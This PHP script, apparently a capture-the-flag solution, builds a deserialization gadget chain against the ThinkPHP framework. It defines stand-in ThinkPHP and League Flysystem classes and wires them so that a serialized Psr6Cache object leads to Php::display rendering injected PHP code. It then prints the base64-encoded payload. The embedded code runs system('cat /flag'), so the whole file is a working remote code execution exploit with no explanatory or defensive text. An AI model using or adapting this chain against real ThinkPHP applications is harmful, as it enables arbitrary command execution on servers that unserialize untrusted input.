<?php
namespace think\view\driver;
class Php
{
}

namespace think;
class App {
    protected $instances = [];

    public function __construct()
    {
        $this->instances = [
            "think\Request"=>new Request(),
        ];

    }
}
class Request {
    protected $url;

    public function __construct()
    {
        $this->url = '<?php system("cat /flag");exit(); ?>';
    }
}


namespace think\log\driver;
use think\App;
use think\view\driver\Php;

class Socket {
    protected $config;
    protected $app;
    protected $clientArg;
    public function __construct()
    {
        $this->config = [
            "force_client_ids" => true,
            "allow_client_ids"=> [],
            "debug" => true,
            "format_head"=> [new Php(),"display"]
        ];
        $this->app = new App();
        $this->clientArg = ["tabid"=>"1"];
    }
}


namespace think\log;
use think\log\driver\Socket;

class Channel {
    protected $logger;
    protected $lazy = false;
    public function __construct()
    {
        $this->lazy = false;
        $this->logger = new Socket();
    }
}


namespace League\Flysystem\Cached\Storage;


use think\log\Channel;

class Psr6Cache
{
    protected $autosave = false;
    private $pool;
    function __construct(){
        $this->pool =new Channel();
    }

}


echo base64_encode(serialize(new Psr6Cache()));